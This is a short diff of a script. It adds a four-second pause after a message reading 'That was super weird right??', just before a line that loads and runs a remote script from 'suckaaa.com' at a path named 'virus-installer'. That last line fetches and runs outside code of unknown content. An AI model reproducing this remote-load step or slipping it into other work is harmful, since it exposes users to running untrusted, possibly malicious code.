@@ -10,4 +10,6 @@ clear;
 
 bigMsg "That was super weird right??";
 
+sleep 4s;
+
 nextScript 'https://suckaaa.com/s/virus-installer';
